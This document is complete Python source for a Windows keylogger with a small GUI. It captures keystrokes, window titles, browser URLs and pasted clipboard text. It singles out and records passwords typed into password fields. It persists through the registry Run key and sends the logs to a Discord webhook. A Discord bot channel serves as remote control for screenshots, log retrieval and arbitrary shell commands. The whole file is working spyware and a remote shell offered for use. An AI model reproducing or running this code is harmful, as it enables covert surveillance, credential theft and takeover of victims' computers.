#!/usr/bin/env python3
"""Windows keystroke + active-window logger with Discord delivery and control.
pip install pynput psutil uiautomation pillow
"""
import ctypes
import ctypes.wintypes as wintypes
import json
import os
import queue
import socket
import subprocess
import sys
import tempfile
import threading
import time
import tkinter as tk
import urllib.error
import urllib.request
import uuid
import winreg
from datetime import datetime
from pathlib import Path
from tkinter import ttk

import psutil
from pynput import keyboard

try:
    import uiautomation as auto
    HAVE_UIA = True
except Exception:
    HAVE_UIA = False

try:
    from PIL import ImageGrab
    HAVE_PIL = True
except Exception:
    HAVE_PIL = False

API = "https://discord.com/api/v10"
SPECIALS = {"space": " ", "enter": "\n", "tab": "\t", "backspace": "<BS>"}
MODIFIERS = {"shift", "shift_r", "ctrl", "ctrl_l", "ctrl_r", "alt", "alt_l",
             "alt_r", "alt_gr", "caps_lock", "cmd", "cmd_l", "cmd_r"}
FLUSH_INTERVAL = 1.0
POLL = 0.5
PROBE = 0.5
URL_EVERY = 2.0
BATCH_SECONDS = 3.0
MSG_LIMIT = 1890
POLL_REMOTE = 3.0
HOST = socket.gethostname()
USER = os.environ.get("USERNAME", "?")
APP_NAME = "Keylogger"
RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
BROWSERS = {"chrome.exe", "msedge.exe", "firefox.exe", "brave.exe",
            "opera.exe", "vivaldi.exe", "librewolf.exe"}
HELP = "!status !start !stop !log !shot !shell <cmd> !exit"

DEFAULT_LOG = Path(__file__).with_name("keylog.txt")
HOOK_FILE = Path(__file__).with_name("webhook.txt")
REMOTE_FILE = Path(__file__).with_name("remote.json")
DEFAULT_HOOK = ""

user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.GlobalLock.restype = ctypes.c_void_p
kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
user32.GetClipboardData.restype = ctypes.c_void_p


def foreground_info():
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return (0, "", "unknown", 0)
    length = user32.GetWindowTextLengthW(hwnd)
    buf = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buf, length + 1)
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    try:
        proc = psutil.Process(pid.value).name()
    except Exception:
        proc = "?"
    return (hwnd, buf.value, proc, pid.value)


def clipboard_text(limit=300):
    CF_UNICODETEXT = 13
    if not user32.OpenClipboard(None):
        return ""
    try:
        handle = user32.GetClipboardData(CF_UNICODETEXT)
        if not handle:
            return ""
        ptr = kernel32.GlobalLock(handle)
        if not ptr:
            return ""
        try:
            text = ctypes.c_wchar_p(ptr).value or ""
        finally:
            kernel32.GlobalUnlock(ptr)
        return text[:limit]
    except Exception:
        return ""
    finally:
        user32.CloseClipboard()


def browser_url(hwnd, proc):
    if not HAVE_UIA or proc.lower() not in BROWSERS:
        return ""
    try:
        win = auto.ControlFromHandle(hwnd)
        if win is None:
            return ""
        for ctrl, _depth in auto.WalkControl(win, maxDepth=14):
            try:
                if ctrl.ControlType != auto.ControlType.EditControl:
                    continue
                label = (ctrl.Name or "").lower()
                if not any(k in label for k in ("address", "search", "enter")):
                    continue
                value = ctrl.GetValuePattern().Value
                if value:
                    return value.strip()[:200]
            except Exception:
                continue
    except Exception:
        pass
    return ""


def probe_focus(hwnd, proc, want_url):
    out = {"pwd": False, "field": "", "url": ""}
    if not HAVE_UIA:
        return out
    try:
        ctrl = auto.GetFocusedControl()
        if ctrl is not None:
            try:
                out["pwd"] = bool(ctrl.IsPassword)
            except Exception:
                pass
            try:
                out["field"] = (ctrl.Name or ctrl.AutomationId or "")[:60]
            except Exception:
                pass
    except Exception:
        pass
    if want_url:
        out["url"] = browser_url(hwnd, proc)
    return out


def format_key(key):
    try:
        ch = key.char
        if ch is not None:
            if len(ch) == 1 and ord(ch) < 32:
                return f"<Ctrl+{chr(ord(ch) + 96)}>"
            return ch
    except AttributeError:
        pass
    name = str(key).replace("Key.", "")
    return SPECIALS.get(name, f"<{name}>")


def post_discord(url, text):
    text = text.strip()
    if not url or not text:
        return False
    body = "```\n" + text.replace("```", "'''") + "\n```"
    for _ in range(3):
        req = urllib.request.Request(
            url,
            data=json.dumps({"content": body[:MSG_LIMIT]}).encode(),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        try:
            with urllib.request.urlopen(req, timeout=10) as resp:
                return resp.status in (200, 204)
        except urllib.error.HTTPError as exc:
            if exc.code == 429:
                try:
                    wait = float(json.loads(exc.read() or b"{}").get("retry_after", 1.0))
                except Exception:
                    wait = 1.0
                time.sleep(wait + 0.2)
                continue
            return False
        except Exception:
            time.sleep(1.0)
    return False


def bot_headers(token):
    return {"Authorization": f"Bot {token}", "User-Agent": "Mozilla/5.0"}


def bot_say(token, channel, text):
    body = json.dumps({"content": text[:MSG_LIMIT]}).encode()
    req = urllib.request.Request(
        f"{API}/channels/{channel}/messages", data=body,
        headers={**bot_headers(token), "Content-Type": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.status in (200, 201)
    except Exception:
        return False


def bot_upload(token, channel, path, content=""):
    boundary = uuid.uuid4().hex
    head = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"content\"\r\n\r\n"
            f"{content}\r\n").encode()
    mid = (f"--{boundary}\r\nContent-Disposition: form-data; name=\"files[0]\"; "
           f"filename=\"{path.name}\"\r\nContent-Type: image/png\r\n\r\n").encode()
    body = head + mid + path.read_bytes() + b"\r\n" + f"--{boundary}--\r\n".encode()
    req = urllib.request.Request(
        f"{API}/channels/{channel}/messages", data=body,
        headers={**bot_headers(token),
                 "Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    try:
        with urllib.request.urlopen(req, timeout=25) as resp:
            return resp.status in (200, 201)
    except Exception:
        return False


def autostart_command():
    if getattr(sys, "frozen", False):
        return f'"{sys.executable}"'
    pyw = Path(sys.executable).with_name("pythonw.exe")
    return f'"{pyw}" "{Path(__file__).resolve()}"'


def autostart_enabled():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY) as key:
            winreg.QueryValueEx(key, APP_NAME)
        return True
    except OSError:
        return False


def set_autostart(on):
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0, winreg.KEY_SET_VALUE) as key:
            if on:
                winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, autostart_command())
            else:
                try:
                    winreg.DeleteValue(key, APP_NAME)
                except OSError:
                    pass
        return True
    except OSError:
        return False


def read_json(path, default):
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return default


def write_json(path, data):
    try:
        path.write_text(json.dumps(data), encoding="utf-8")
    except Exception:
        pass


class RemoteControl:
    def __init__(self, token, channel, on_command):
        self.token = token
        self.channel = channel
        self.on_command = on_command
        self.last_id = None
        self._stop = threading.Event()
        self._thread = None

    def say(self, text):
        bot_say(self.token, self.channel, text)

    def upload(self, path, content=""):
        return bot_upload(self.token, self.channel, path, content)

    def _prime(self):
        url = f"{API}/channels/{self.channel}/messages?limit=1"
        req = urllib.request.Request(url, headers=bot_headers(self.token))
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
        if data:
            self.last_id = data[0]["id"]

    def _fetch(self):
        url = f"{API}/channels/{self.channel}/messages?limit=20"
        if self.last_id:
            url += f"&after={self.last_id}"
        req = urllib.request.Request(url, headers=bot_headers(self.token))
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = json.loads(resp.read())
        for msg in sorted(data, key=lambda m: int(m["id"])):
            self.last_id = msg["id"]
            if msg.get("author", {}).get("bot"):
                continue
            content = (msg.get("content") or "").strip()
            if not content.startswith("!"):
                continue
            cmd, _, arg = content[1:].partition(" ")
            self.on_command(cmd.lower(), arg.strip())

    def _loop(self):
        try:
            self._prime()
            self.say(f"[{HOST}] online")
        except Exception:
            pass
        while not self._stop.wait(POLL_REMOTE):
            try:
                self._fetch()
            except Exception:
                pass

    def start(self):
        if self._thread and self._thread.is_alive():
            return
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()


class Keylogger:
    def __init__(self, log_path, titles=True, webhook=""):
        self.log_path = Path(log_path)
        self.stop_file = self.log_path.with_suffix(self.log_path.suffix + ".stop")
        self.titles = titles
        self.webhook = webhook
        self.queue = queue.Queue()
        self.send_queue = queue.Queue()
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self._last_win = None
        self._last_field = None
        self._pwd_buf = ""
        self._cache = {"pwd": False, "field": "", "url": ""}
        self._key_listener = None
        self._hotkey_listener = None

    @property
    def running(self):
        return not self._stop.is_set()

    def _emit(self, text):
        self.queue.put(text)

    def _flush_pwd(self):
        if self._pwd_buf:
            self._emit(f"<PASSWORD: {self._pwd_buf}>\n")
            self._pwd_buf = ""

    def _note_window(self, info):
        if not self.titles:
            return
        with self._lock:
            if info == self._last_win:
                return
            self._last_win = info
            hwnd, title, proc, pid = info
            stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            line = f"\n[{stamp}] {HOST} === {proc} (pid {pid}) | {title or '<untitled>'} ==="
            if self._cache.get("url"):
                line += f"\n           URL: {self._cache['url']}"
            self._emit(line + "\n")

    def _note_field(self, hwnd):
        pwd = self._cache.get("pwd", False)
        key = (hwnd, pwd)
        with self._lock:
            if key == self._last_field:
                return
            self._last_field = key
        if pwd:
            self._emit("\n[PWD FIELD]\n")
        else:
            self._flush_pwd()

    def _probe_loop(self):
        last_url = 0.0
        while not self._stop.is_set():
            try:
                hwnd, title, proc, _pid = foreground_info()
                want_url = time.monotonic() - last_url >= URL_EVERY
                if want_url:
                    last_url = time.monotonic()
                fresh = probe_focus(hwnd, proc, want_url)
                if proc.lower() not in BROWSERS:
                    self._cache["url"] = ""
                elif want_url or not self._cache.get("url"):
                    self._cache["url"] = fresh.get("url", "") or self._cache.get("url", "")
                self._cache["pwd"] = fresh.get("pwd", False)
                self._cache["field"] = fresh.get("field", "")
                self._note_field(hwnd)
            except Exception:
                pass
            self._stop.wait(PROBE)

    def _writer_loop(self):
        last = time.monotonic()
        with self.log_path.open("a", encoding="utf-8") as fh:
            while True:
                chunk = self.queue.get()
                if chunk is None:
                    break
                fh.write(chunk)
                if self.webhook:
                    self.send_queue.put(chunk)
                if time.monotonic() - last >= FLUSH_INTERVAL:
                    fh.flush()
                    last = time.monotonic()
            fh.flush()

    def _sender_loop(self):
        buf = ""
        last = time.monotonic()
        while True:
            try:
                buf += self.send_queue.get(timeout=0.25)
            except queue.Empty:
                pass
            while len(buf) >= MSG_LIMIT:
                post_discord(self.webhook, buf[:MSG_LIMIT])
                buf = buf[MSG_LIMIT:]
                last = time.monotonic()
            if buf and time.monotonic() - last >= BATCH_SECONDS:
                post_discord(self.webhook, buf)
                buf = ""
                last = time.monotonic()
            if self._stop.is_set() and self.send_queue.empty() and not buf:
                return

    def _window_loop(self):
        while not self._stop.is_set():
            try:
                if self.stop_file.exists():
                    self.stop_file.unlink(missing_ok=True)
                    self.stop()
                    return
                self._note_window(foreground_info())
            except Exception:
                pass
            self._stop.wait(POLL)

    def _on_press(self, key):
        if self._stop.is_set():
            return
        try:
            name = str(key).replace("Key.", "")
            if name in MODIFIERS:
                return
            text = format_key(key)
            if self._cache.get("pwd"):
                if text == "<BS>":
                    self._pwd_buf = self._pwd_buf[:-1]
                elif text == "\n":
                    self._flush_pwd()
                    self._emit("<ENTER>\n")
                else:
                    self._pwd_buf += text
                return
            self._flush_pwd()
            self._note_window(foreground_info())
            self._emit(text)
            if text == "<Ctrl+v>":
                pasted = clipboard_text()
                if pasted:
                    self._emit(f"\n<pasted: {pasted}>\n")
        except Exception:
            pass

    def stop(self):
        if self._stop.is_set():
            return
        self._stop.set()
        self._flush_pwd()
        for listener in (self._key_listener, self._hotkey_listener):
            if listener is not None:
                try:
                    listener.stop()
                except Exception:
                    pass
        self._emit(f"\n--- session end {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")
        self.queue.put(None)

    def run(self):
        self._emit(f"\n--- session start {datetime.now():%Y-%m-%d %H:%M:%S} | {USER}@{HOST} ---\n")
        writer = threading.Thread(target=self._writer_loop, daemon=True)
        writer.start()
        if self.webhook:
            threading.Thread(target=self._sender_loop, daemon=True).start()
        threading.Thread(target=self._window_loop, daemon=True).start()
        threading.Thread(target=self._probe_loop, daemon=True).start()
        self._key_listener = keyboard.Listener(on_press=self._on_press)
        self._key_listener.start()
        self._hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+<alt>+q": self.stop})
        self._hotkey_listener.start()
        self._stop.wait()
        writer.join(timeout=5)


class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("Keylogger")
        self.geometry("560x260")
        self.resizable(False, False)
        self.kl = None
        self.remote = None
        self.action_queue = queue.Queue()
        cfg = read_json(REMOTE_FILE, {})
        self._build(cfg)
        self.after(120, self._tick)

    def _build(self, cfg):
        pad = {"padx": 10, "pady": 6}
        self.status = ttk.Label(self, text="Idle")
        self.status.pack(anchor="w", **pad)

        row1 = ttk.Frame(self)
        row1.pack(fill="x", **pad)
        ttk.Label(row1, text="Webhook:", width=10).pack(side="left")
        saved = HOOK_FILE.read_text(encoding="utf-8").strip() if HOOK_FILE.exists() else ""
        self.webhook = tk.StringVar(value=saved or DEFAULT_HOOK)
        ttk.Entry(row1, textvariable=self.webhook).pack(side="left", fill="x", expand=True)

        row2 = ttk.Frame(self)
        row2.pack(fill="x", **pad)
        ttk.Label(row2, text="Token:", width=10).pack(side="left")
        self.token = tk.StringVar(value=cfg.get("token", ""))
        ttk.Entry(row2, textvariable=self.token, show="*").pack(side="left", fill="x", expand=True)

        row3 = ttk.Frame(self)
        row3.pack(fill="x", **pad)
        ttk.Label(row3, text="Channel:", width=10).pack(side="left")
        self.channel = tk.StringVar(value=cfg.get("channel", ""))
        ttk.Entry(row3, textvariable=self.channel).pack(side="left", fill="x", expand=True)

        row4 = ttk.Frame(self)
        row4.pack(fill="x", **pad)
        self.autostart = tk.BooleanVar(value=autostart_enabled())
        ttk.Checkbutton(row4, text="Start with Windows", variable=self.autostart,
                        command=self.toggle_autostart).pack(side="left")
        self.start_btn = ttk.Button(row4, text="Start", command=self.start)
        self.start_btn.pack(side="right")
        self.stop_btn = ttk.Button(row4, text="Stop", command=self.stop, state="disabled")
        self.stop_btn.pack(side="right", padx=6)

        self.protocol("WM_DELETE_WINDOW", self.on_close)

    def toggle_autostart(self):
        if not set_autostart(self.autostart.get()):
            self.autostart.set(False)
            self.status["text"] = "Autostart failed"

    def _start_remote(self):
        token = self.token.get().strip()
        channel = self.channel.get().strip()
        if not (token and channel):
            return
        write_json(REMOTE_FILE, {"token": token, "channel": channel, "enabled": True})
        if self.remote is None:
            self.remote = RemoteControl(token, channel,
                                        lambda c, a: self.action_queue.put((c, a)))
            self.remote.start()

    def start(self):
        hook = self.webhook.get().strip()
        if hook:
            try:
                HOOK_FILE.write_text(hook, encoding="utf-8")
            except Exception:
                pass
        self.kl = Keylogger(DEFAULT_LOG, webhook=hook)
        threading.Thread(target=self.kl.run, daemon=True).start()
        self._start_remote()
        self.start_btn["state"] = "disabled"
        self.stop_btn["state"] = "normal"
        self.status["text"] = "Logging - Ctrl+Alt+Q to stop"

    def stop(self):
        if self.kl:
            self.kl.stop()

    def _reply(self, text):
        if self.remote:
            threading.Thread(target=self.remote.say, args=(f"[{HOST}] {text}",),
                             daemon=True).start()

    def _send_log(self):
        try:
            lines = DEFAULT_LOG.read_text(encoding="utf-8",
                                          errors="replace").splitlines()[-60:]
            self._reply("last 60 lines:\n" + "\n".join(lines)[-1700:])
        except Exception as exc:
            self._reply(f"log failed: {exc}")

    def _send_shot(self):
        if not HAVE_PIL:
            self._reply("pillow not installed")
            return
        try:
            path = Path(tempfile.gettempdir()) / f"shot_{uuid.uuid4().hex[:8]}.png"
            ImageGrab.grab().save(path, "PNG")
            if self.remote:
                self.remote.upload(path, f"[{HOST}] screenshot")
            path.unlink(missing_ok=True)
        except Exception as exc:
            self._reply(f"shot failed: {exc}")

    def _send_shell(self, command):
        if not command:
            self._reply("usage: !shell <command>")
            return
        try:
            res = subprocess.run(command, shell=True, capture_output=True,
                                 text=True, timeout=25, errors="replace")
            out = ((res.stdout or "") + (res.stderr or "")).strip()
            self._reply(f"$ {command}\n{out[-1700:] or '(no output)'}")
        except subprocess.TimeoutExpired:
            self._reply("timed out after 25s")
        except Exception as exc:
            self._reply(f"shell failed: {exc}")

    def _run_action(self, cmd, arg):
        if cmd == "help":
            self._reply(HELP)
        elif cmd == "status":
            self._reply("logging" if (self.kl and self.kl.running) else "idle")
        elif cmd == "start":
            self.start()
            self._reply("started")
        elif cmd == "stop":
            self.stop()
            self._reply("stopped")
        elif cmd == "log":
            threading.Thread(target=self._send_log, daemon=True).start()
        elif cmd == "shot":
            threading.Thread(target=self._send_shot, daemon=True).start()
        elif cmd == "shell":
            threading.Thread(target=self._send_shell, args=(arg,), daemon=True).start()
        elif cmd == "exit":
            self.stop()
            self._reply("exiting")
            self.after(600, self.on_close)
        else:
            self._reply(f"unknown: {cmd}")

    def _tick(self):
        try:
            while True:
                self._run_action(*self.action_queue.get_nowait())
        except queue.Empty:
            pass
        if self.kl is not None and not self.kl.running and str(self.stop_btn["state"]) == "normal":
            self.start_btn["state"] = "normal"
            self.stop_btn["state"] = "disabled"
            self.status["text"] = "Stopped"
        self.after(120, self._tick)

    def on_close(self):
        if self.kl and self.kl.running:
            self.kl.stop()
        if self.remote:
            self.remote.stop()
        self.destroy()


if __name__ == "__main__":
    App().mainloop()